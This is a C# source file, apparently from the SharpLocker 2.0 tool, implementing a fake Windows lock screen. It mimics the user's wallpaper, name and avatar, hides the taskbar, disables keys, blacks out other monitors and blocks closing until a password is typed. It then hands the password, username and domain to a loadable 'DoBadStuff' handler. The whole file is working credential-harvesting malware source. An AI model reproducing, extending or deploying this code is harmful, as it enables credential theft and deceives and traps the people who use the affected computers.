using SharpLocker_2._0.Classes;
using System;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SharpLocker_2._0
{
    public partial class WindowsLogin : Form
    {
        private bool DenyClose { get; set; }
        private Interfaces.IDoBadStuff DoBadStuff;

        public WindowsLogin()
        {
            InitializeComponent();
            Initialize();
        }

        #region "Lock"

        private void WindowsLogin_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = DenyClose;
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }


        #endregion

        private void LoginButton_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(PasswordTextBox.Text)) return;

            DenyClose = false;
            TaskbarHandler.ShowTaskbar();
            KeyPressHandler.Enable();

            DoBadStuff.Now(PasswordTextBox.Text, Environment.UserName, Environment.UserDomainName);

            Close();
        }

        private void PasswordTextBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter) LoginButton.PerformClick();
        }

        #region "Init"

        private void WindowsLogin_Load(object sender, EventArgs e)
        {
            BlurBackground();
        }

        private void Initialize()
        {
            DenyClose = true;

            InitializeTaskbar();
            InitializeUserLabel();
            InitializeUserIcon();
            InitializeBackground();
            InitializeBadStuff();
            InitializeOtherScreens();
        }

        private void InitializeBadStuff()
        {
            DoBadStuff = new Interfaces.BadStuffLoader().Get();

            if(DoBadStuff == null) DoBadStuff = new DefaultBadStuff();
        }

        private void InitializeTaskbar()
        {
            TaskbarHandler.HideTaskbar();
            KeyPressHandler.Disable();
        }

        private void InitializeUserLabel()
        {
            UserNameLabel.Text = Environment.UserName;
        }

        private Bitmap GetBackgroundImage() => new Bitmap(@Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft\\Windows\\Themes\\TranscodedWallpaper"));

        private void InitializeBackground() => BackgroundImage = GetBackgroundImage();

        private void BlurBackground()
        {
            GaussianBlur blur = new GaussianBlur(GetBackgroundImage());
            BackgroundImage = blur.Process(10);
        }

        private void InitializeUserIcon()
        {
            UserIconPictureBox.Image = Image.FromFile(Directory.GetFiles(Path.GetTempPath(), @"*.bmp").FirstOrDefault(x => x.Contains(Environment.UserName)));

            System.Drawing.Drawing2D.GraphicsPath gp = new System.Drawing.Drawing2D.GraphicsPath();
            gp.AddEllipse(0, 0, UserIconPictureBox.Width - 3, UserIconPictureBox.Height - 3);
            Region rg = new Region(gp);
            UserIconPictureBox.Region = rg;
        }

        private void InitializeOtherScreens()
        {
            foreach (Screen screen in Screen.AllScreens.Where(x => !x.Primary))
            {
                new Task(() => BlackScreen(screen)).Start();
            }
        }

        private void BlackScreen(Screen screen)
        {
            Form blackForm = new Form()
            {
                Location = new Point(screen.WorkingArea.Left, screen.WorkingArea.Top),
                WindowState = FormWindowState.Maximized,
                StartPosition = FormStartPosition.Manual,
                FormBorderStyle = FormBorderStyle.None,
                BackColor = Color.Black
            };

            blackForm.FormClosing += WindowsLogin_FormClosing;

            blackForm.ShowDialog();
        }

        private void WindowsLogin_Paint(object sender, PaintEventArgs e)
        {
            int offset = 3;
            e.Graphics.DrawRectangle(new Pen(LoginButton.FlatAppearance.BorderColor), new Rectangle(
                PasswordTextBox.Location.X - offset,
                PasswordTextBox.Location.Y - offset,
                PasswordTextBox.Width + offset * 2,
                PasswordTextBox.Height + offset * 2));
        }

        #endregion

    }
}
